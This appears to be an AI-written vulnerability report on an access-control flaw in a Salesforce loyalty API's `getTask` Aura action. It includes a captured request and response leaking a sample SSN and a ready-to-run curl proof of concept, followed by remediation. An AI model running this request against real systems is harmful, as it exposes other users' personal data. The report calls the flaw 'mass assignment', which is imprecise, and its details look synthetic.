# Security Analysis Report
**System:** RewardCore Loyalty API (Retail / Loyalty Programme) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0023 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.12 | Mass assignment via object fields — `TaskController.getTask` returns client-specified fields without ownership check |

---

## Finding 1 — Mass Assignment: Cross-User Loyalty Task Record Exposed via Client-Controlled Fields (CRITICAL)

### Summary
The `TaskController` Apex class on RewardCore Loyalty API (`2202d5cc.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Task records. The `getTask` Aura action accepts a client-supplied `fields` array — enabling the caller to control which object fields are returned. With no ownership check on `taskId`, an attacker can (a) access any user's loyalty task record by substituting a victim `taskId`, and (b) add sensitive field names to the `fields` array to harvest data beyond what the UI normally requests. This Pattern 1.12 mass assignment attack exposes retail loyalty programme data and PII.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://2202d5cc.lightning.force.com/aura`

### Evidence from HAR

**Request:**
```
POST https://2202d5cc.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D2202D5CC!AR2202d5cc...
Content-Type: application/x-www-form-urlencoded

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","params":{"taskId":"001D5CC","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{"actions":[{"id":"1;a","state":"SUCCESS","returnValue":{"records":[{"Id":"001D5CC","Name":"Victim Task Record","OwnerId":"005VICTIM","InternalNotes__c":"CONFIDENTIAL: internal review notes","SensitiveData__c":"SSN: 000-68-4203"}]},"error":[]}]}
```

**`aura.token`:** `undefined`

### Evidence Map
| Artifact Location | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD=Private bypassed |
| §4.0 SOQL | No OwnerId check | Missing predicate | Root cause |
| §5.0 Pattern 1.12 | Vulnerability | Client-controlled `fields` | Mass assignment vector |
| HAR descriptor | `c.TaskController.getTask` | Aura action | Entry point |
| HAR params | `taskId` | `001D5CC` | Victim record |
| HAR params | `fields` | `["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]` | Client-controlled field selection |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-68-4203` | PII leaked |

### Steps to Reproduce
```bash
SF_TOKEN="00D2202D5CC!AR2202d5cc..."
curl -s -X POST "https://2202d5cc.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001D5CC","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# VULNERABLE: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-68-4203
```

### Remediation
1. `public with sharing class TaskController {`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist.
4. Validate `aura.token` server-side.
5. Retail loyalty data includes points balances, purchase history — breach enables loyalty fraud.
